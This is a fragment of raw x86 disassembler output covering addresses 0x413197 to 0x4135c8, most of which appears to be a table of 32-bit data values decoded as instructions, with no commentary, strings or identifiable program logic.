  413197:	mov    DWORD PTR [ebx],ebp
  413199:	jl     0x4131a8
  41319b:	xor    eax,0xaae61144
  4131a0:	mov    cl,0x9b
  4131a2:	push   edx
  4131a3:	pop    edi
  4131a4:	imul   esp,DWORD PTR es:[ebp+0xf],0x1
  4131a9:	dec    edi
  4131aa:	sub    edi,0xffffffde
  4131ad:	pop    esi
  4131ae:	gs in  eax,dx
  4131b0:	jb     0x413193
  4131b2:	ds pusha 
  4131b4:	ss inc edx
  4131b6:	es aam 0xca
  4131b9:	push   0x4d
  4131bb:	mov    edi,0x1bab1b9
  4131c0:	into   
  4131c1:	inc    ecx
  4131c2:	data16 aas 
  4131c4:	psubusb mm3,QWORD PTR [ecx+0x1da484ef]
  4131cb:	sbb    eax,DWORD PTR [ebx+0x2769fad7]
  4131d1:	dec    ebp
  4131d2:	add    BYTE PTR [eax],al
  4131d4:	pop    esp
  4131d5:	inc    ecx
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	in     al,dx
  4131d9:	inc    edx
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	cs inc ebx
  4131de:	add    DWORD PTR [eax],eax
  4131e0:	mov    eax,0xf6000140
  4131e5:	inc    eax
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	mov    BYTE PTR [edx+0x1],0x0
  4131ec:	push   eax
  4131ed:	inc    edx
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	mov    dh,0x42
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	add    BYTE PTR [ecx+0x1],0x0
  4131f8:	test   BYTE PTR [ecx+0x1],0x0
  4131fc:	inc    esp
  4131fd:	inc    ecx
  4131fe:	add    DWORD PTR [eax],eax
  413200:	mov    BYTE PTR [eax+0x1],0x0
  413204:	enter  0x141,0x0
  413208:	sbb    al,0x41
  41320a:	add    DWORD PTR [eax],eax
  41320c:	mov    BYTE PTR [edx+0x1],al
  41320f:	add    BYTE PTR [ebx+eax*2+0x1],al
  413213:	add    al,bl
  413215:	inc    edx
  413216:	add    DWORD PTR [eax],eax
  413218:	(bad)  
  413219:	inc    eax
  41321a:	add    DWORD PTR [eax],eax
  41321c:	add    BYTE PTR [eax+0x1],0x0
  413220:	mov    dh,0x41
  413222:	add    DWORD PTR [eax],eax
  413224:	ins    BYTE PTR es:[edi],dx
  413225:	inc    edx
  413226:	add    DWORD PTR [eax],eax
  413228:	or     al,BYTE PTR [ebx+0x1]
  41322b:	add    BYTE PTR [edx+0x41],ch
  41322e:	add    DWORD PTR [eax],eax
  413230:	sbb    BYTE PTR [edx+0x1],al
  413233:	add    BYTE PTR [eax+0x40000142],ch
  413239:	inc    edx
  41323a:	add    DWORD PTR [eax],eax
  41323c:	nop
  41323d:	inc    ebx
  41323e:	add    DWORD PTR [eax],eax
  413240:	add    al,0x42
  413242:	add    DWORD PTR [eax],eax
  413244:	out    0x40,al
  413246:	add    DWORD PTR [eax],eax
  413248:	cwde   
  413249:	inc    edx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	sahf   
  41324d:	inc    eax
  41324e:	add    DWORD PTR [eax],eax
  413250:	pop    eax
  413251:	inc    ebx
  413252:	add    DWORD PTR [eax],eax
  413254:	inc    ax
  413256:	add    DWORD PTR [eax],eax
  413258:	xor    al,BYTE PTR [edx+0x1]
  41325b:	add    BYTE PTR [esi+0x43],ch
  41325e:	add    DWORD PTR [eax],eax
  413260:	push   es
  413261:	inc    ecx
  413262:	add    DWORD PTR [eax],eax
  413264:	loop   0x4132a7
  413266:	add    DWORD PTR [eax],eax
  413268:	pop    esi
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	sahf   
  41326d:	inc    ecx
  41326e:	add    DWORD PTR [eax],eax
  413270:	add    BYTE PTR [eax],al
  413272:	add    BYTE PTR [eax],al
  413274:	lods   al,BYTE PTR ds:[esi]
  413275:	inc    edi
  413276:	add    DWORD PTR [eax],eax
  413278:	aam    0x44
  41327a:	add    DWORD PTR [eax],eax
  41327c:	push   0x44
  41327e:	add    DWORD PTR [eax],eax
  413280:	stos   BYTE PTR es:[edi],al
  413281:	inc    ebp
  413282:	add    DWORD PTR [eax],eax
  413284:	push   eax
  413285:	inc    esi
  413286:	add    DWORD PTR [eax],eax
  413288:	push   eax
  413289:	inc    esp
  41328a:	add    DWORD PTR [eax],eax
  41328c:	test   BYTE PTR [ebp+0x1],al
  41328f:	add    dh,ah
  413291:	inc    edi
  413292:	add    DWORD PTR [eax],eax
  413294:	pusha  
  413295:	inc    ebp
  413296:	add    DWORD PTR [eax],eax
  413298:	call   0x344133e0
  41329d:	inc    esi
  41329e:	add    DWORD PTR [eax],eax
  4132a0:	push   ss
  4132a1:	inc    esp
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	lock inc esp
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	add    BYTE PTR [ebp+0x1],al
  4132ab:	add    BYTE PTR [eax],al
  4132ad:	dec    eax
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	xchg   BYTE PTR [ecx+eax*1+0x0],al
  4132b4:	and    BYTE PTR [edi+0x1],al
  4132b7:	add    BYTE PTR [esi+0x44000146],bl
  4132bd:	inc    ebp
  4132be:	add    DWORD PTR [eax],eax
  4132c0:	ss inc esp
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	dec    edx
  4132c5:	inc    edi
  4132c6:	add    DWORD PTR [eax],eax
  4132c8:	sbb    BYTE PTR [esi+0x1],al
  4132cb:	add    BYTE PTR [esp+eax*2+0x47720001],dh
  4132d2:	add    DWORD PTR [eax],eax
  4132d4:	repnz inc esi
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	xchg   esp,eax
  4132d9:	inc    edi
  4132da:	add    DWORD PTR [eax],eax
  4132dc:	cmp    BYTE PTR [edi+0x1],al
  4132df:	add    dl,cl
  4132e1:	inc    edi
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	mov    esi,0x82000146
  4132e9:	inc    esi
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	add    BYTE PTR [ecx+eax*1+0x0],al
  4132f0:	test   BYTE PTR [ebp+0x1],0x0
  4132f4:	into   
  4132f5:	inc    ebx
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	(bad)  
  4132f9:	inc    esi
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	cmp    BYTE PTR [eax+0x1],cl
  4132ff:	add    BYTE PTR [esp+eax*2+0x46680001],bl
  413306:	add    DWORD PTR [eax],eax
  413308:	int3   
  413309:	inc    ebp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	sbb    al,0x48
  41330e:	add    DWORD PTR [eax],eax
  413310:	push   es
  413311:	inc    edi
  413312:	add    DWORD PTR [eax],eax
  413314:	and    al,BYTE PTR [ebp+0x1]
  413317:	add    BYTE PTR [ebx+eax*2+0x1],dh
  41331e:	add    BYTE PTR [eax],al
  413320:	fs dec ecx
  413322:	add    DWORD PTR [eax],eax
  413324:	fimul  DWORD PTR [ecx+eax*1+0x0]
  413328:	je     0x413374
  41332a:	add    DWORD PTR [eax],eax
  41332c:	fmul   DWORD PTR [edx+0x1]
  41332f:	add    BYTE PTR [esi-0x27fffeb4],cl
  413335:	dec    ecx
  413336:	add    DWORD PTR [eax],eax
  413338:	jl     0x413382
  41333a:	add    DWORD PTR [eax],eax
  41333c:	out    dx,al
  41333d:	dec    ebx
  41333e:	add    DWORD PTR [eax],eax
  413340:	bound  ecx,QWORD PTR [ecx+eax*1+0x0]
  413344:	outs   dx,BYTE PTR ds:[esi]
  413345:	dec    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	inc    edx
  413349:	dec    ebp
  41334a:	add    DWORD PTR [eax],eax
  41334c:	retf   0x14b
  41334f:	add    BYTE PTR [eax],bh
  413351:	dec    ebx
  413352:	add    DWORD PTR [eax],eax
  413354:	js     0x41339f
  413356:	add    DWORD PTR [eax],eax
  413358:	(bad)  
  413359:	dec    esp
  41335a:	add    DWORD PTR [eax],eax
  41335c:	xor    BYTE PTR [ecx+eax*1+0x0],cl
  413360:	pop    esi
  413361:	dec    eax
  413362:	add    DWORD PTR [eax],eax
  413364:	(bad)  
  413365:	dec    eax
  413366:	add    DWORD PTR [eax],eax
  413368:	and    al,0x49
  41336a:	add    DWORD PTR [eax],eax
  41336c:	add    BYTE PTR [ecx+eax*1+0x0],cl
  413370:	xor    al,0x4d
  413372:	add    DWORD PTR [eax],eax
  413374:	(bad)  
  413375:	dec    ecx
  413376:	add    DWORD PTR [eax],eax
  413378:	or     BYTE PTR [ecx+0x1],cl
  41337b:	add    dl,ch
  41337d:	dec    esp
  41337e:	add    DWORD PTR [eax],eax
  413380:	lods   al,BYTE PTR ds:[esi]
  413381:	dec    esp
  413382:	add    DWORD PTR [eax],eax
  413384:	es dec ebx
  413386:	add    DWORD PTR [eax],eax
  413388:	adc    cl,BYTE PTR [edx+0x1]
  41338b:	add    BYTE PTR [eax-0x53fffeb7],al
  413391:	dec    ebp
  413392:	add    DWORD PTR [eax],eax
  413394:	jl     0x4133e2
  413396:	add    DWORD PTR [eax],eax
  413398:	mov    dh,0x49
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   es
  41339d:	dec    ebp
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jb     0x4133ee
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	call   0x14b:0xa4000149
  4133ab:	add    BYTE PTR [eax],bh
  4133ad:	dec    ecx
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	inc    edx
  4133b1:	dec    esp
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	push   esp
  4133b5:	dec    ebp
  4133b6:	add    DWORD PTR [eax],eax
  4133b8:	mov    esi,0x9000014a
  4133bd:	dec    edx
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	jle    0x41340c
  4133c2:	add    DWORD PTR [eax],eax
  4133c4:	mov    ds:0xb2000149,al
  4133c9:	dec    edx
  4133ca:	add    DWORD PTR [eax],eax
  4133cc:	call   0x14c:0xf600014d
  4133d3:	add    ah,dh
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	loopne 0x413425
  4133da:	add    DWORD PTR [eax],eax
  4133dc:	adc    al,0x49
  4133de:	add    DWORD PTR [eax],eax
  4133e0:	pop    edx
  4133e1:	dec    edx
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	pop    eax
  4133e5:	dec    ecx
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	mov    al,ds:0xfa00014a
  4133ed:	dec    ecx
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	in     al,dx
  4133f1:	dec    edx
  4133f2:	add    DWORD PTR [eax],eax
  4133f4:	pusha  
  4133f5:	dec    ebx
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	inc    esp
  4133f9:	dec    edx
  4133fa:	add    DWORD PTR [eax],eax
  4133fc:	nop
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	jp     0x41344d
  413402:	add    DWORD PTR [eax],eax
  413404:	adc    BYTE PTR [ecx+eax*1+0x0],cl
  413408:	adc    BYTE PTR [ebx+0x1],cl
  41340b:	add    BYTE PTR [eax+0x4a],ch
  41340e:	add    DWORD PTR [eax],eax
  413410:	mov    edx,0x4c00014b
  413415:	dec    ebx
  413416:	add    DWORD PTR [eax],eax
  413418:	mov    edx,0x2a000148
  41341d:	dec    edx
  41341e:	add    DWORD PTR [eax],eax
  413420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413421:	dec    eax
  413422:	add    DWORD PTR [eax],eax
  413424:	test   BYTE PTR [ebp+0x1],cl
  413427:	add    BYTE PTR [eax],bl
  413429:	dec    ebp
  41342a:	add    DWORD PTR [eax],eax
  41342c:	xchg   edx,eax
  41342d:	dec    eax
  41342e:	add    DWORD PTR [eax],eax
  413430:	add    BYTE PTR [eax],al
  413432:	add    BYTE PTR [eax],al
  413434:	ror    BYTE PTR [esi+0x1],1
  413437:	add    BYTE PTR [edx],cl
  413439:	dec    esi
  41343a:	add    DWORD PTR [eax],eax
  41343c:	push   ds
  41343d:	dec    edi
  41343e:	add    DWORD PTR [eax],eax
  413440:	lods   al,BYTE PTR ds:[esi]
  413441:	dec    esi
  413442:	add    DWORD PTR [eax],eax
  413444:	js     0x413494
  413446:	add    DWORD PTR [eax],eax
  413448:	mov    al,ds:0x5e00014e
  41344d:	dec    edi
  41344e:	add    DWORD PTR [eax],eax
  413450:	dec    edx
  413451:	dec    esi
  413452:	add    DWORD PTR [eax],eax
  413454:	add    cl,BYTE PTR [edi+0x1]
  413457:	add    BYTE PTR [eax+0x4e],bl
  41345a:	add    DWORD PTR [eax],eax
  41345c:	sub    BYTE PTR [esi+0x1],cl
  41345f:	add    BYTE PTR [esi+ecx*2+0x1],ch
  413463:	add    BYTE PTR [edx+0x4f],dl
  413466:	add    DWORD PTR [eax],eax
  413468:	retf   0x14d
  41346b:	add    dl,bh
  41346d:	dec    ebp
  41346e:	add    DWORD PTR [eax],eax
  413470:	mov    BYTE PTR [esi+0x1],cl
  413473:	add    dl,bl
  413475:	dec    ebp
  413476:	add    DWORD PTR [eax],eax
  413478:	push   cs
  413479:	dec    edi
  41347a:	add    DWORD PTR [eax],eax
  41347c:	jmp    0x14e:0xbc00014d
  413483:	add    ah,dh
  413485:	dec    esi
  413486:	add    DWORD PTR [eax],eax
  413488:	cmp    al,0x4e
  41348a:	add    DWORD PTR [eax],eax
  41348c:	ds dec edi
  41348e:	add    DWORD PTR [eax],eax
  413490:	sbb    BYTE PTR [esi+0x1],cl
  413493:	add    BYTE PTR [eax],dh
  413495:	dec    edi
  413496:	add    DWORD PTR [eax],eax
  413498:	add    BYTE PTR [eax],al
  41349a:	add    BYTE PTR [eax],al
  41349c:	xor    dl,BYTE PTR [ebx+0x1]
  41349f:	add    BYTE PTR [esi-0x2dfffeb1],dl
  4134a5:	push   ebx
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	or     dl,BYTE PTR [ebp+0x1]
  4134ab:	add    BYTE PTR [esi-0x51fffead],bl
  4134b1:	push   eax
  4134b2:	add    DWORD PTR [eax],eax
  4134b4:	js     0x413506
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	retf   0x152
  4134bb:	add    BYTE PTR [esi+0x51],dl
  4134be:	add    DWORD PTR [eax],eax
  4134c0:	(bad)  
  4134c1:	push   ebx
  4134c2:	add    DWORD PTR [eax],eax
  4134c4:	fcom   DWORD PTR [eax+0x1]
  4134c7:	add    BYTE PTR [eax-0x17fffeb1],cl
  4134cd:	push   eax
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	xchg   edx,eax
  4134d1:	push   ecx
  4134d2:	add    DWORD PTR [eax],eax
  4134d4:	adc    al,0x51
  4134d6:	add    DWORD PTR [eax],eax
  4134d8:	ror    BYTE PTR [edi+0x1],1
  4134db:	add    BYTE PTR [esi+0x50],cl
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	not    BYTE PTR [ecx+0x1]
  4134e3:	add    dl,ah
  4134e5:	dec    edi
  4134e6:	add    DWORD PTR [eax],eax
  4134e8:	and    al,0x52
  4134ea:	add    DWORD PTR [eax],eax
  4134ec:	not    BYTE PTR [eax+0x1]
  4134ef:	add    BYTE PTR [eax+0x2c000152],cl
  4134f5:	push   esp
  4134f6:	add    DWORD PTR [eax],eax
  4134f8:	mov    esp,0xb2000151
  4134fd:	push   esp
  4134fe:	add    DWORD PTR [eax],eax
  413500:	jmp    0x151:0x44000152
  413507:	add    BYTE PTR [edx+edx*2],dh
  41350a:	add    DWORD PTR [eax],eax
  41350c:	inc    eax
  41350d:	push   eax
  41350e:	add    DWORD PTR [eax],eax
  413510:	fs push eax
  413512:	add    DWORD PTR [eax],eax
  413514:	mov    WORD PTR [eax+0x1],ss
  413517:	add    dh,ah
  413519:	push   ebx
  41351a:	add    DWORD PTR [eax],eax
  41351c:	adc    al,0x53
  41351e:	add    DWORD PTR [eax],eax
  413520:	ret    0x154
  413523:	add    BYTE PTR [ebx+edx*2+0x547e0001],cl
  41352a:	add    DWORD PTR [eax],eax
  41352c:	sbb    BYTE PTR [ecx+eax*1+0x0],dl
  413530:	call   0x152:0x96000150
  413537:	add    BYTE PTR [esi],al
  413539:	push   ecx
  41353a:	add    DWORD PTR [eax],eax
  41353c:	mov    ah,0x53
  41353e:	add    DWORD PTR [eax],eax
  413540:	fcom   QWORD PTR [edx+0x1]
  413543:	add    BYTE PTR [esp+edx*2],cl
  413546:	add    DWORD PTR [eax],eax
  413548:	jp     0x413599
  41354a:	add    DWORD PTR [eax],eax
  41354c:	sub    dl,BYTE PTR [ecx+0x1]
  41354f:	add    BYTE PTR [eax+0x54],al
  413552:	add    DWORD PTR [eax],eax
  413554:	push   esi
  413555:	push   esp
  413556:	add    DWORD PTR [eax],eax
  413558:	push   ss
  413559:	push   eax
  41355a:	add    DWORD PTR [eax],eax
  41355c:	push   0xb8000154
  413561:	push   edx
  413562:	add    DWORD PTR [eax],eax
  413564:	jbe    0x4135b9
  413566:	add    DWORD PTR [eax],eax
  413568:	bound  edx,QWORD PTR [edx+0x1]
  41356b:	add    BYTE PTR [esi+0x52],dl
  41356e:	add    DWORD PTR [eax],eax
  413570:	fcom   QWORD PTR [ecx+0x1]
  413573:	add    dl,al
  413575:	dec    edi
  413576:	add    DWORD PTR [eax],eax
  413578:	cld    
  413579:	push   edx
  41357a:	add    DWORD PTR [eax],eax
  41357c:	sub    al,0x50
  41357e:	add    DWORD PTR [eax],eax
  413580:	cld    
  413581:	push   esp
  413582:	add    DWORD PTR [eax],eax
  413584:	enter  0x150,0x0
  413588:	test   al,0x52
  41358a:	add    DWORD PTR [eax],eax
  41358c:	je     0x4135e0
  41358e:	add    DWORD PTR [eax],eax
  413590:	dec    BYTE PTR [edi+0x1]
  413593:	add    BYTE PTR [edx-0x19fffeaf],ch
  413599:	push   esp
  41359a:	add    DWORD PTR [eax],eax
  41359c:	pop    eax
  41359d:	push   ebx
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	mov    WORD PTR [ecx+eax*1+0x0],ss
  4135a4:	or     BYTE PTR [edx+0x1],dl
  4135a7:	add    BYTE PTR [ecx+edx*2+0x1],bh
  4135ab:	add    BYTE PTR [eax+0x2000014f],dh
  4135b1:	push   ebx
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	aam    0x54
  4135b6:	add    DWORD PTR [eax],eax
  4135b8:	push   ds
  4135b9:	push   ebp
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	push   0x51
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	dec    edx
  4135c1:	push   ebx
  4135c2:	add    DWORD PTR [eax],eax
  4135c4:	inc    esi
  4135c5:	push   edx
  4135c6:	add    DWORD PTR [eax],eax
  4135c8:	call   0x0:0x154
	...
